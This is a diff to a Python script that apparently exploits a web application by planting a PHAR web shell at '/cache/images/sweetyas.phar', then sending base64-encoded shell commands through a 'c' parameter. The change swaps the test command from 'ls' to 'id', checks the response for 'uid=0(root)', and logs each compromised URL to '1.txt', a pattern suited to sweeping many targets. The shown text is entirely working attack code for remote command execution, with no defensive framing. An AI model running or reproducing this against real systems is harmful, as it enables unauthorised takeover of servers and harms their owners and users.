@@ -36,13 +36,15 @@ requests.post(url, cookies=session, data=params, files=upload, verify=False, tim
 url = sys.argv[1] + "/cache/images/sweetyas.phar"
 
 
-cmd = "ls"
+cmd = "id"
 data_bytes = cmd.encode("utf-8")
-res = requests.post(url, data={"c": base64.b64encode(data_bytes)}, verify=False)
-res = re.search("#####(.*)#####", res.text, re.DOTALL)
-if res:
-	with open('1.txt', 'a') as file:
-		file.write(url+'\n')
-	file.close()
-else:
-	sys.exit("\n[+] Failure!\n")
+try:
+	res = requests.post(url, data={"c": base64.b64encode(data_bytes)}, verify=False)
+	if ('uid=0(root)' in str(res.content, 'utf-8')):
+		with open('1.txt', 'a') as file:
+			file.write(url+'\n')
+		file.close()
+	else:
+		sys.exit("[+] Failure!\n")
+except:
+	sys.exit("nnn\n")
